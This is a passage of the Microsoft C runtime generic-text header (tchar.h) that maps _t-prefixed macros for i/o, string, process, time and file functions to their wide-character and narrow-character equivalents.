#endif  /* _CRT_INTERNAL_NONSTDC_NAMES */

#define _TEOF       WEOF

#define __T(x)      L ## x


/* Program */

#define _tmain      wmain
#define _tWinMain   wWinMain
#define _tenviron   _wenviron
#define __targv     __wargv

/* Formatted i/o */

#define _tprintf        wprintf
#define _tprintf_l      _wprintf_l
#define _tprintf_s      wprintf_s
#define _tprintf_s_l    _wprintf_s_l
#define _tprintf_p      _wprintf_p
#define _tprintf_p_l    _wprintf_p_l
#define _tcprintf       _cwprintf
#define _tcprintf_l     _cwprintf_l
#define _tcprintf_s     _cwprintf_s
#define _tcprintf_s_l   _cwprintf_s_l
#define _tcprintf_p     _cwprintf_p
#define _tcprintf_p_l   _cwprintf_p_l
#define _vtcprintf      _vcwprintf
#define _vtcprintf_l    _vcwprintf_l
#define _vtcprintf_s    _vcwprintf_s
#define _vtcprintf_s_l  _vcwprintf_s_l
#define _vtcprintf_p    _vcwprintf_p
#define _vtcprintf_p_l  _vcwprintf_p_l
#define _ftprintf       fwprintf
#define _ftprintf_l     _fwprintf_l
#define _ftprintf_s     fwprintf_s
#define _ftprintf_s_l   _fwprintf_s_l
#define _ftprintf_p     _fwprintf_p
#define _ftprintf_p_l   _fwprintf_p_l
#define _stprintf       _swprintf
#define _stprintf_l     __swprintf_l
#define _stprintf_s     swprintf_s
#define _stprintf_s_l   _swprintf_s_l
#define _stprintf_p     _swprintf_p
#define _stprintf_p_l   _swprintf_p_l
#define _sctprintf      _scwprintf
#define _sctprintf_l    _scwprintf_l
#define _sctprintf_p    _scwprintf_p
#define _sctprintf_p_l  _scwprintf_p_l
#define _sntprintf      _snwprintf
#define _sntprintf_l    _snwprintf_l
#define _sntprintf_s    _snwprintf_s
#define _sntprintf_s_l  _snwprintf_s_l
#define _vtprintf       vwprintf
#define _vtprintf_l     _vwprintf_l
#define _vtprintf_s     vwprintf_s
#define _vtprintf_s_l   _vwprintf_s_l
#define _vtprintf_p     _vwprintf_p
#define _vtprintf_p_l   _vwprintf_p_l
#define _vftprintf      vfwprintf
#define _vftprintf_l    _vfwprintf_l
#define _vftprintf_s    vfwprintf_s
#define _vftprintf_s_l  _vfwprintf_s_l
#define _vftprintf_p    _vfwprintf_p
#define _vftprintf_p_l  _vfwprintf_p_l
#define _vstprintf      vswprintf
#define _vstprintf_l    _vswprintf_l
#define _vstprintf_s    vswprintf_s
#define _vstprintf_s_l  _vswprintf_s_l
#define _vstprintf_p    _vswprintf_p
#define _vstprintf_p_l  _vswprintf_p_l
#define _vsctprintf     _vscwprintf
#define _vsctprintf_l   _vscwprintf_l
#define _vsctprintf_p   _vscwprintf_p
#define _vsctprintf_p_l _vscwprintf_p_l
#define _vsntprintf     _vsnwprintf
#define _vsntprintf_l   _vsnwprintf_l
#define _vsntprintf_s   _vsnwprintf_s
#define _vsntprintf_s_l _vsnwprintf_s_l

#define _tscanf         wscanf
#define _tscanf_l       _wscanf_l
#define _tscanf_s       wscanf_s
#define _tscanf_s_l     _wscanf_s_l
#define _tcscanf        _cwscanf
#define _tcscanf_l      _cwscanf_l
#define _tcscanf_s      _cwscanf_s
#define _tcscanf_s_l    _cwscanf_s_l
#define _ftscanf        fwscanf
#define _ftscanf_l      _fwscanf_l
#define _ftscanf_s      fwscanf_s
#define _ftscanf_s_l    _fwscanf_s_l
#define _stscanf        swscanf
#define _stscanf_l      _swscanf_l
#define _stscanf_s      swscanf_s
#define _stscanf_s_l    _swscanf_s_l
#define _sntscanf       _snwscanf
#define _sntscanf_l     _snwscanf_l
#define _sntscanf_s     _snwscanf_s
#define _sntscanf_s_l   _snwscanf_s_l
#define _vtscanf        vwscanf
#define _vtscanf_s      vwscanf_s
#define _vftscanf       vfwscanf
#define _vftscanf_s     vfwscanf_s
#define _vstscanf       vswscanf
#define _vstscanf_s     vswscanf_s


/* Unformatted i/o */

#define _fgettc          fgetwc
#define _fgettc_nolock   _fgetwc_nolock
#define _fgettchar       _fgetwchar
#define _fgetts          fgetws
#define _fputtc          fputwc
#define _fputtc_nolock   _fputwc_nolock
#define _fputtchar       _fputwchar
#define _fputts          fputws
#define _cputts          _cputws
#define _cgetts_s        _cgetws_s
#define _gettc           getwc
#define _gettc_nolock    _getwc_nolock
#define _gettch          _getwch
#define _gettch_nolock   _getwch_nolock
#define _gettche         _getwche
#define _gettche_nolock  _getwche_nolock
#define _gettchar        getwchar
#define _gettchar_nolock _getwchar_nolock
#define _getts_s         _getws_s
#define _puttc           putwc
#define _puttc_nolock    _fputwc_nolock
#define _puttchar        putwchar
#define _puttchar_nolock _putwchar_nolock
#define _puttch          _putwch
#define _puttch_nolock   _putwch_nolock
#define _putts           _putws
#define _ungettc         ungetwc
#define _ungettc_nolock  _ungetwc_nolock
#define _ungettch        _ungetwch
#define _ungettch_nolock _ungetwch_nolock


/* String conversion functions */

#define _tcstod     wcstod
#define _tcstof     wcstof
#define _tcstol     wcstol
#define _tcstold    wcstold
#define _tcstoll    wcstoll
#define _tcstoul    wcstoul
#define _tcstoull   wcstoull
#define _tcstoimax  wcstoimax
#define _tcstoumax  wcstoumax
#define _tcstoi64   _wcstoi64
#define _tcstoui64  _wcstoui64
#define _ttof       _wtof
#define _tstof      _wtof
#define _tstol      _wtol
#define _tstoll     _wtoll
#define _tstoi      _wtoi
#define _tstoi64    _wtoi64
#define _tcstod_l     _wcstod_l
#define _tcstof_l     _wcstof_l
#define _tcstol_l     _wcstol_l
#define _tcstold_l    _wcstold_l
#define _tcstoll_l    _wcstoll_l
#define _tcstoul_l    _wcstoul_l
#define _tcstoull_l   _wcstoull_l
#define _tcstoi64_l   _wcstoi64_l
#define _tcstoui64_l  _wcstoui64_l
#define _tcstoimax_l  _wcstoimax_l
#define _tcstoumax_l  _wcstoumax_l
#define _tstof_l      _wtof_l
#define _tstol_l      _wtol_l
#define _tstoll_l     _wtoll_l
#define _tstoi_l      _wtoi_l
#define _tstoi64_l    _wtoi64_l

#define _itot_s     _itow_s
#define _ltot_s     _ltow_s
#define _ultot_s    _ultow_s
#define _itot       _itow
#define _ltot       _ltow
#define _ultot      _ultow
#define _ttoi       _wtoi
#define _ttol       _wtol
#define _ttoll      _wtoll

#define _ttoi64     _wtoi64
#define _i64tot_s   _i64tow_s
#define _ui64tot_s  _ui64tow_s
#define _i64tot     _i64tow
#define _ui64tot    _ui64tow

/* String functions */

#define _tcscat         wcscat
#define _tcscat_s       wcscat_s
#define _tcschr         wcschr
#define _tcscpy         wcscpy
#define _tcscpy_s       wcscpy_s
#define _tcscspn        wcscspn
#define _tcslen         wcslen
#define _tcsnlen        wcsnlen
#define _tcsncat        wcsncat
#define _tcsncat_s      wcsncat_s
#define _tcsncat_l      _wcsncat_l
#define _tcsncat_s_l    _wcsncat_s_l
#define _tcsncpy        wcsncpy
#define _tcsncpy_s      wcsncpy_s
#define _tcsncpy_l      _wcsncpy_l
#define _tcsncpy_s_l    _wcsncpy_s_l
#define _tcspbrk        wcspbrk
#define _tcsrchr        wcsrchr
#define _tcsspn         wcsspn
#define _tcsstr         wcsstr
#define _tcstok         _wcstok
#define _tcstok_s       wcstok_s
#define _tcstok_l       _wcstok_l
#define _tcstok_s_l     _wcstok_s_l
#define _tcserror       _wcserror
#define _tcserror_s     _wcserror_s
#define __tcserror      __wcserror
#define __tcserror_s    __wcserror_s

#define _tcsdup         _wcsdup
#define _tcsnset        _wcsnset
#define _tcsnset_s      _wcsnset_s
#define _tcsnset_l      _wcsnset_l
#define _tcsnset_s_l    _wcsnset_s_l
#define _tcsrev         _wcsrev
#define _tcsset         _wcsset
#define _tcsset_s       _wcsset_s
#define _tcsset_l       _wcsset_l
#define _tcsset_s_l     _wcsset_s_l

#define _tcscmp         wcscmp
#define _tcsicmp        _wcsicmp
#define _tcsicmp_l      _wcsicmp_l
#define _tcsnccmp       wcsncmp
#define _tcsncmp        wcsncmp
#define _tcsncicmp      _wcsnicmp
#define _tcsncicmp_l    _wcsnicmp_l
#define _tcsnicmp       _wcsnicmp
#define _tcsnicmp_l     _wcsnicmp_l

#define _tcscoll        wcscoll
#define _tcscoll_l      _wcscoll_l
#define _tcsicoll       _wcsicoll
#define _tcsicoll_l     _wcsicoll_l
#define _tcsnccoll      _wcsncoll
#define _tcsnccoll_l    _wcsncoll_l
#define _tcsncoll       _wcsncoll
#define _tcsncoll_l     _wcsncoll_l
#define _tcsncicoll     _wcsnicoll
#define _tcsncicoll_l   _wcsnicoll_l
#define _tcsnicoll      _wcsnicoll
#define _tcsnicoll_l    _wcsnicoll_l

#ifdef _DEBUG
#define _tcsdup_dbg _wcsdup_dbg
#endif  /* _DEBUG */

/* Execute functions */

#define _texecl     _wexecl
#define _texecle    _wexecle
#define _texeclp    _wexeclp
#define _texeclpe   _wexeclpe
#define _texecv     _wexecv
#define _texecve    _wexecve
#define _texecvp    _wexecvp
#define _texecvpe   _wexecvpe

#define _tspawnl    _wspawnl
#define _tspawnle   _wspawnle
#define _tspawnlp   _wspawnlp
#define _tspawnlpe  _wspawnlpe
#define _tspawnv    _wspawnv
#define _tspawnve   _wspawnve
#define _tspawnvp   _wspawnvp
#define _tspawnvp   _wspawnvp
#define _tspawnvpe  _wspawnvpe

#define _tsystem    _wsystem


/* Time functions */

#define _tasctime   _wasctime
#define _tctime     _wctime
#define _tctime32   _wctime32
#define _tctime64   _wctime64
#define _tstrdate   _wstrdate
#define _tstrtime   _wstrtime
#define _tutime     _wutime
#define _tutime32   _wutime32
#define _tutime64   _wutime64
#define _tcsftime   wcsftime
#define _tcsftime_l _wcsftime_l

#define _tasctime_s   _wasctime_s
#define _tctime_s     _wctime_s
#define _tctime32_s   _wctime32_s
#define _tctime64_s   _wctime64_s
#define _tstrdate_s   _wstrdate_s
#define _tstrtime_s   _wstrtime_s

/* Directory functions */

#define _tchdir             _wchdir
#define _tgetcwd            _wgetcwd
#define _tgetdcwd           _wgetdcwd
#define _tgetdcwd_nolock    _wgetdcwd_nolock
#define _tmkdir             _wmkdir
#define _trmdir             _wrmdir

#ifdef _DEBUG
#define _tgetcwd_dbg        _wgetcwd_dbg
#define _tgetdcwd_dbg       _wgetdcwd_dbg
#define _tgetdcwd_lk_dbg    _wgetdcwd_lk_dbg
#endif  /* _DEBUG */

/* Environment/Path functions */

#define _tfullpath      _wfullpath
#define _tgetenv        _wgetenv
#define _tgetenv_s      _wgetenv_s
#define _tdupenv_s      _wdupenv_s
#define _tmakepath      _wmakepath
#define _tmakepath_s    _wmakepath_s
#define _tpgmptr        _wpgmptr
#define _get_tpgmptr    _get_wpgmptr
#define _tputenv        _wputenv
#define _tputenv_s      _wputenv_s
#define _tsearchenv     _wsearchenv
#define _tsearchenv_s   _wsearchenv_s
#define _tsplitpath     _wsplitpath
#define _tsplitpath_s   _wsplitpath_s

#ifdef _DEBUG
#define _tfullpath_dbg  _wfullpath_dbg
#define _tdupenv_s_dbg  _wdupenv_s_dbg
#endif  /* _DEBUG */

/* Stdio functions */

#define _tfdopen    _wfdopen
#define _tfsopen    _wfsopen
#define _tfopen     _wfopen
#define _tfopen_s   _wfopen_s
#define _tfreopen   _wfreopen
#define _tfreopen_s _wfreopen_s
#define _tperror    _wperror
#define _tpopen     _wpopen
#define _ttempnam   _wtempnam
#define _ttmpnam    _wtmpnam
#define _ttmpnam_s  _wtmpnam_s

#ifdef _DEBUG
#define _ttempnam_dbg   _wtempnam_dbg
#endif  /* _DEBUG */


/* Io functions */

#define _taccess    _waccess
#define _taccess_s  _waccess_s
#define _tchmod     _wchmod
#define _tcreat     _wcreat
#define _tfindfirst       _wfindfirst
#define _tfindfirst32     _wfindfirst32
#define _tfindfirst64     _wfindfirst64
#define _tfindfirsti64    _wfindfirsti64
#define _tfindfirst32i64  _wfindfirst32i64
#define _tfindfirst64i32  _wfindfirst64i32
#define _tfindnext        _wfindnext
#define _tfindnext32      _wfindnext32
#define _tfindnext64      _wfindnext64
#define _tfindnexti64     _wfindnexti64
#define _tfindnext32i64   _wfindnext32i64
#define _tfindnext64i32   _wfindnext64i32
#define _tmktemp    _wmktemp
#define _tmktemp_s  _wmktemp_s
#define _topen      _wopen
#define _tremove    _wremove
#define _trename    _wrename
#define _tsopen     _wsopen
#define _tsopen_s   _wsopen_s
#define _tunlink    _wunlink

#define _tfinddata_t      _wfinddata_t
#define _tfinddata32_t    _wfinddata32_t
#define _tfinddata64_t    _wfinddata64_t
#define _tfinddatai64_t   _wfinddatai64_t
#define _tfinddata32i64_t _wfinddata32i64_t
#define _tfinddata64i32_t _wfinddata64i32_t


/* Stat functions */

#define _tstat      _wstat
#define _tstat32    _wstat32
#define _tstat32i64 _wstat32i64
#define _tstat64    _wstat64
#define _tstat64i32 _wstat64i32
#define _tstati64   _wstati64


/* Setlocale functions */

#define _tsetlocale _wsetlocale


/* Redundant "logical-character" mappings */

#define _tcsclen        wcslen
#define _tcscnlen       wcsnlen
#define _tcsclen_l(_String, _Locale) wcslen(_String)
#define _tcscnlen_l(_String, _Max_count, _Locale) wcsnlen((_String), (_Max_count))
#define _tcsnccat       wcsncat
#define _tcsnccat_s     wcsncat_s
#define _tcsnccat_l     _wcsncat_l
#define _tcsnccat_s_l   _wcsncat_s_l
#define _tcsnccpy       wcsncpy
#define _tcsnccpy_s     wcsncpy_s
#define _tcsnccpy_l     _wcsncpy_l
#define _tcsnccpy_s_l   _wcsncpy_s_l
#define _tcsncset       _wcsnset
#define _tcsncset_s     _wcsnset_s
#define _tcsncset_l     _wcsnset_l
#define _tcsncset_s_l   _wcsnset_s_l

#define _tcsdec     _wcsdec
#define _tcsinc     _wcsinc
#define _tcsnbcnt   _wcsncnt
#define _tcsnccnt   _wcsncnt
#define _tcsnextc   _wcsnextc
#define _tcsninc    _wcsninc
#define _tcsspnp    _wcsspnp

#define _tcslwr     _wcslwr
#define _tcslwr_l   _wcslwr_l
#define _tcslwr_s   _wcslwr_s
#define _tcslwr_s_l _wcslwr_s_l
#define _tcsupr     _wcsupr
#define _tcsupr_l   _wcsupr_l
#define _tcsupr_s   _wcsupr_s
#define _tcsupr_s_l _wcsupr_s_l
#define _tcsxfrm    wcsxfrm
#define _tcsxfrm_l  _wcsxfrm_l


#if __STDC__ || defined (_NO_INLINING)
#define _tclen(_pc) (1)
#define _tccpy(_pc1,_cpc2) ((*(_pc1) = *(_cpc2)))
#define _tccpy_l(_pc1,_cpc2,_locale) _tccpy((_pc1),(_cpc2))
#define _tccmp(_cpc1,_cpc2) ((*(_cpc1))-(*(_cpc2)))
#else  /* __STDC__ || defined (_NO_INLINING) */
_Check_return_ __inline size_t __CRTDECL _tclen(_In_z_ const wchar_t *_Cpc)
{
    /* avoid compiler warning */
    (void)_Cpc;
    return 1;
}
__inline void __CRTDECL _tccpy(_Out_ wchar_t *_Pc1, _In_z_ const wchar_t *_Cpc2) { *_Pc1 = (wchar_t)*_Cpc2; }
__inline void __CRTDECL _tccpy_l(_Out_ wchar_t *_Pc1, _In_z_ const wchar_t *_Cpc2, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    _tccpy(_Pc1, _Cpc2);
}
_Check_return_ __inline int __CRTDECL _tccmp(_In_z_ const wchar_t *_Cpc1, _In_z_ const wchar_t *_Cpc2) { return (int) ((*_Cpc1)-(*_Cpc2)); }
#endif  /* __STDC__ || defined (_NO_INLINING) */

/* ctype functions */

#define _istalnum   iswalnum
#define _istalnum_l   _iswalnum_l
#define _istalpha   iswalpha
#define _istalpha_l   _iswalpha_l
#define _istascii   iswascii
#define _istcntrl   iswcntrl
#define _istcntrl_l   _iswcntrl_l
#define _istdigit   iswdigit
#define _istdigit_l   _iswdigit_l
#define _istgraph   iswgraph
#define _istgraph_l   _iswgraph_l
#define _istlower   iswlower
#define _istlower_l   _iswlower_l
#define _istprint   iswprint
#define _istprint_l   _iswprint_l
#define _istpunct   iswpunct
#define _istpunct_l   _iswpunct_l
#define _istblank   iswblank
#define _istblank_l   _iswblank_l
#define _istspace   iswspace
#define _istspace_l   _iswspace_l
#define _istupper   iswupper
#define _istupper_l   _iswupper_l
#define _istxdigit  iswxdigit
#define _istxdigit_l  _iswxdigit_l

#define _totupper   towupper
#define _totupper_l   _towupper_l
#define _totlower   towlower
#define _totlower_l   _towlower_l

#define _istlegal(_Char)                (1)
#define _istlead(_Char)                 (0)
#define _istleadbyte(_Char)             (0)
#define _istleadbyte_l(_Char, _Locale)  (0)


#if __STDC__ || defined _NO_INLINING
#define _wcsdec(_cpc1, _cpc2) ((_cpc1)&gt;=(_cpc2) ? NULL : (_cpc2)-1)
#define _wcsinc(_pc)    ((_pc)+1)
#define _wcsnextc(_cpc) ((unsigned int) *(_cpc))
#define _wcsninc(_pc, _sz) (((_pc)+(_sz)))
_Check_return_ _ACRTIMP size_t __cdecl __wcsncnt(_In_reads_or_z_(_MaxCount) const wchar_t * _Str, _In_ size_t _MaxCount);
#define _wcsncnt(_cpc, _sz) (__wcsncnt(_cpc,_sz))
#define _wcsspnp(_cpc1, _cpc2)                                                          (_cpc1==NULL ? NULL : ((*((_cpc1)+wcsspn(_cpc1,_cpc2))) ? ((_cpc1)+wcsspn(_cpc1,_cpc2)) : NULL))
#define _wcsncpy_l(_Destination, _Source, _Count, _Locale)                              (wcsncpy(_Destination, _Source, _Count))
#if __STDC_WANT_SECURE_LIB__
#define _wcsncpy_s_l(_Destination, _Destination_size_chars, _Source, _Count, _Locale)   (wcsncpy_s(_Destination, _Destination_size_chars, _Source, _Count))
#endif  /* __STDC_WANT_SECURE_LIB__ */
#define _wcsncat_l(_Destination, _Source, _Count, _Locale)                              (wcsncat(_Destination, _Source, _Count))
#if __STDC_WANT_SECURE_LIB__
#define _wcsncat_s_l(_Destination, _Destination_size_chars, _Source, _Count, _Locale)   (wcsncat_s(_Destination, _Destination_size_chars, _Source, _Count))
#endif  /* __STDC_WANT_SECURE_LIB__ */
#define _wcstok_l(_String, _Delimiters, _Locale)                                        (_wcstok(_String, _Delimiters))
#define _wcstok_s_l(_String, _Delimiters, _Current_position, _Locale)                   (wcstok_s(_String, _Delimiters, _Current_position))
#define _wcsnset_l(_Destination, _Value, _Count, _Locale)                               (_wcsnset(_Destination, _Value, _Count))
#define _wcsnset_s_l(_Destination, _Destination_size_chars, _Value, _Count, _Locale)    (_wcsnset_s(_Destination, _Destination_size_chars, _Value, _Count))
#define _wcsset_l(_Destination, _Value, _Locale)                                        (_wcsset(_Destination, _Value))
#define _wcsset_s_l(_Destination, _Destination_size_chars, _Value, _Locale)             (_wcsset_s(_Destination, _Destination_size_chars, _Value))
#else  /* __STDC__ || defined (_NO_INLINING) */
_Check_return_ __inline wchar_t * __CRTDECL _wcsdec(_In_z_ const wchar_t * _Cpc1, _In_z_ const wchar_t * _Cpc2) { return (wchar_t *)((_Cpc1)&gt;=(_Cpc2) ? NULL : ((_Cpc2)-1)); }
_Check_return_ __inline wchar_t * __CRTDECL _wcsinc(_In_z_ const wchar_t * _Pc) { return (wchar_t *)(_Pc+1); }
_Check_return_ __inline unsigned int __CRTDECL _wcsnextc(_In_z_ const wchar_t * _Cpc) { return (unsigned int)*_Cpc; }
_Check_return_ __inline wchar_t * __CRTDECL _wcsninc(_In_z_ const wchar_t * _Pc, _In_ size_t _Sz) { return (wchar_t *)(_Pc+_Sz); }
_Check_return_ __inline size_t __CRTDECL _wcsncnt( _In_reads_or_z_(_Cnt) const wchar_t * _String, _In_ size_t _Cnt)
{
        size_t n = _Cnt;
        wchar_t *cp = (wchar_t *)_String;
        while (n-- &amp;&amp; *cp)
                cp++;
        return _Cnt - n - 1;
}
_Check_return_ __inline wchar_t * __CRTDECL _wcsspnp
(
    _In_z_ const wchar_t * _Cpc1,
    _In_z_ const wchar_t * _Cpc2
)
{
    return _Cpc1==NULL ? NULL : ((*(_Cpc1 += wcsspn(_Cpc1,_Cpc2))!='\0') ? (wchar_t*)_Cpc1 : NULL);
}

#if __STDC_WANT_SECURE_LIB__
_Check_return_wat_ __inline errno_t __CRTDECL _wcsncpy_s_l(_Out_writes_z_(_Destination_size_chars) wchar_t *_Destination, _In_ size_t _Destination_size_chars, _In_z_ const wchar_t *_Source, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return wcsncpy_s(_Destination, _Destination_size_chars, _Source, _Count);
}
#endif  /* __STDC_WANT_SECURE_LIB__ */

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _wcsncpy_s_l, wchar_t, _Dest, _In_z_ const wchar_t *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(wchar_t *, __RETURN_POLICY_DST, _wcsncpy_l, _wcsncpy_s_l, _Out_writes_z_(_Size) wchar_t, _Out_writes_(_Count) wchar_t, _Dst, _In_z_ const wchar_t *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    _CRT_UNUSED(_Locale);
#pragma warning(suppress: 6054) // String may not be zero-terminated
    return wcsncpy(_Dst, _Source, _Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(wchar_t *, __RETURN_POLICY_DST, _wcsncpy_l, _wcsncpy_s_l, _Out_writes_z_(_Size) wchar_t, _Out_writes_(_Count), wchar_t, _Dst, _In_z_ const wchar_t *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

#if __STDC_WANT_SECURE_LIB__
_Check_return_wat_ __inline errno_t __CRTDECL _wcsncat_s_l(_Inout_updates_z_(_Destination_size_chars) wchar_t *_Destination, _In_ size_t _Destination_size_chars, _In_z_ const wchar_t *_Source, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return wcsncat_s(_Destination, _Destination_size_chars, _Source, _Count);
}
#endif  /* __STDC_WANT_SECURE_LIB__ */

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _wcsncat_s_l, wchar_t, _Dest, _In_z_ const wchar_t *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(wchar_t *, __RETURN_POLICY_DST, _wcsncat_l, _wcsncat_s_l, _Inout_updates_z_(_Size) wchar_t, _Inout_z_ wchar_t, _Dst, _In_z_ const wchar_t *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)
{
    _CRT_UNUSED(_Locale);
// C6054: String may not be zero-terminated
// C6059: Incorrect length parameter in call
#pragma warning(suppress: 6054 6059)
    return wcsncat(_Dst, _Source, _Count);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(wchar_t *, __RETURN_POLICY_DST, _wcsncat_l, _wcsncat_s_l, _Inout_updates_z_(_Size) wchar_t, _Inout_z_, wchar_t, _Dst, _In_z_ const wchar_t *, _Source, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

_CRT_INSECURE_DEPRECATE(_wcstok_s_l) __inline wchar_t * _wcstok_l(_Inout_opt_z_ wchar_t * _String, _In_z_ const wchar_t * _Delimiters, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
#ifdef _CRT_NON_CONFORMING_WCSTOK
        return wcstok(_String,_Delimiters);
#else
        return wcstok(_String,_Delimiters,0);
#endif
}

#if __STDC_WANT_SECURE_LIB__
__inline wchar_t * _wcstok_s_l(_Inout_opt_z_ wchar_t * _String, _In_z_ const wchar_t * _Delimiters, _Inout_ _Deref_prepost_opt_z_ wchar_t **_Current_position, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return wcstok_s(_String, _Delimiters, _Current_position);
}
#endif /* __STDC_WANT_SECURE_LIB__ */

_Check_return_wat_ __inline errno_t _wcsnset_s_l(_Inout_updates_z_(_Destination_size_chars) wchar_t * _Destination, _In_ size_t _Destination_size_chars, _In_ wchar_t _Value, _In_ size_t _Count, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return _wcsnset_s(_Destination, _Destination_size_chars, _Value, _Count);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_3(errno_t, _wcsnset_s_l, _Prepost_z_ wchar_t, _Dest, _In_ wchar_t, _Value, _In_ size_t, _Count, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(wchar_t *, __RETURN_POLICY_DST, _wcsnset_l, _wcsnset_s_l, _Inout_updates_z_(_Size) wchar_t, _Inout_updates_z_(_MaxCount) wchar_t, _Dst, _In_ wchar_t, _Value, _In_ size_t, _MaxCount, _In_opt_ _locale_t, _Locale)
{
    _CRT_UNUSED(_Locale);
    return _wcsnset(_Dst, _Value, _MaxCount);
}

__DEFINE_CPP_OVERLOAD_INLINE_NFUNC_0_3_EX(wchar_t *, __RETURN_POLICY_DST, _wcsnset_l, _wcsnset_s_l, _Inout_updates_z_(_Size) wchar_t, _Inout_updates_z_(_MaxCount), wchar_t, _Dst, _In_ wchar_t, _Value, _In_ size_t, _MaxCount, _In_opt_ _locale_t, _Locale)

_Check_return_wat_ __inline errno_t _wcsset_s_l(_Inout_updates_z_(_Destination_size_chars) wchar_t * _Destination, _In_ size_t _Destination_size_chars, _In_ wchar_t _Value, _In_opt_ _locale_t _Locale)
{
    _CRT_UNUSED(_Locale);
    return _wcsset_s(_Destination, _Destination_size_chars, _Value);
}

__DEFINE_CPP_OVERLOAD_SECURE_FUNC_0_2(errno_t, _wcsset_s_l, _Prepost_z_ wchar_t, _Dest, _In_ wchar_t, _Value, _In_opt_ _locale_t, _Locale)

__DECLARE_CPP_OVERLOAD_INLINE_FUNC_0_2_EX(wchar_t *, __RETURN_POLICY_DST, _wcsset_l, _wcsset_s_l, _Inout_updates_z_(_Size) wchar_t, _Inout_z_ wchar_t, _Dst, _In_ wchar_t, _Value, _In_opt_ _locale_t, _Locale)
{
    _CRT_UNUSED(_Locale);
    return _wcsset(_Dst, _Value);
}

__DEFINE_CPP_OVERLOAD_INLINE_FUNC_0_2_EX(wchar_t *, __RETURN_POLICY_DST, _wcsset_l, _wcsset_s_l, _Inout_updates_z_(_Size) wchar_t, _Inout_z_, wchar_t, _Dst, _In_ wchar_t, _Value, _In_opt_ _locale_t, _Locale)

#endif  /* __STDC__ || defined (_NO_INLINING) */

#else  /* _UNICODE */

/* ++++++++++++++++++++ SBCS and MBCS ++++++++++++++++++++ */

#ifdef __cplusplus
}   /* ... extern "C" */
#endif  /* __cplusplus */

#include &lt;string.h&gt;

#ifdef __cplusplus
extern "C" {
#endif  /* __cplusplus */


#define _TEOF       EOF

#define __T(x)      x


/* Program */

#define _tmain      main
#define _tWinMain   WinMain
#define _tenviron  _environ
#define __targv     __argv


/* Formatted i/o */

#define _tprintf        printf
#define _tprintf_l      _printf_l
#define _tprintf_s      printf_s
#define _tprintf_s_l    _printf_s_l
#define _tprintf_p      _printf_p
#define _tprintf_p_l    _printf_p_l
#define _tcprintf       _cprintf
#define _tcprintf_l     _cprintf_l
#define _tcprintf_s     _cprintf_s
#define _tcprintf_s_l   _cprintf_s_l
#define _tcprintf_p     _cprintf_p
#define _tcprintf_p_l   _cprintf_p_l
#define _vtcprintf      _vcprintf
#define _vtcprintf_l    _vcprintf_l
#define _vtcprintf_s    _vcprintf_s
#define _vtcprintf_s_l  _vcprintf_s_l
#define _vtcprintf_p    _vcprintf_p
#define _vtcprintf_p_l  _vcprintf_p_l
#define _ftprintf       fprintf
#define _ftprintf_l     _fprintf_l
#define _ftprintf_s     fprintf_s
#define _ftprintf_s_l   _fprintf_s_l
#define _ftprintf_p     _fprintf_p
#define _ftprintf_p_l   _fprintf_p_l
#define _stprintf       sprintf
#define _stprintf_l     _sprintf_l
#define _stprintf_s     sprintf_s
#define _stprintf_s_l   _sprintf_s_l
#define _stprintf_p     _sprintf_p
#define _stprintf_p_l   _sprintf_p_l
#define _sctprintf      _scprintf
#define _sctprintf_l    _scprintf_l
#define _sctprintf_p    _scprintf_p
#define _sctprintf_p_l  _scprintf_p_l
#define _sntprintf      _snprintf
#define _sntprintf_l    _snprintf_l
#define _sntprintf_s    _snprintf_s
#define _sntprintf_s_l  _snprintf_s_l
#define _vtprintf       vprintf
#define _vtprintf_l     _vprintf_l
#define _vtprintf_s     vprintf_s
#define _vtprintf_s_l   _vprintf_s_l
#define _vtprintf_p     _vprintf_p
#define _vtprintf_p_l   _vprintf_p_l
#define _vftprintf      vfprintf
#define _vftprintf_l    _vfprintf_l
#define _vftprintf_s    vfprintf_s
#define _vftprintf_s_l  _vfprintf_s_l
#define _vftprintf_p    _vfprintf_p
#define _vftprintf_p_l  _vfprintf_p_l
#define _vstprintf      vsprintf
#define _vstprintf_l    _vsprintf_l
#define _vstprintf_s    vsprintf_s
#define _vstprintf_s_l  _vsprintf_s_l
#define _vstprintf_p    _vsprintf_p
#define _vstprintf_p_l  _vsprintf_p_l
#define _vsctprintf     _vscprintf
#define _vsctprintf_l   _vscprintf_l
#define _vsctprintf_p   _vscprintf_p
#define _vsctprintf_p_l _vscprintf_p_l
#define _vsntprintf     _vsnprintf
#define _vsntprintf_l   _vsnprintf_l
#define _vsntprintf_s   _vsnprintf_s
#define _vsntprintf_s_l _vsnprintf_s_l

#define _tscanf         scanf
#define _tscanf_l       _scanf_l
#define _tscanf_s       scanf_s
#define _tscanf_s_l     _scanf_s_l
#define _tcscanf        _cscanf
#define _tcscanf_l      _cscanf_l
#define _tcscanf_s      _cscanf_s
#define _tcscanf_s_l    _cscanf_s_l
#define _ftscanf        fscanf
#define _ftscanf_l      _fscanf_l
#define _ftscanf_s      fscanf_s
#define _ftscanf_s_l    _fscanf_s_l
#define _stscanf        sscanf
#define _stscanf_l      _sscanf_l
#define _stscanf_s      sscanf_s
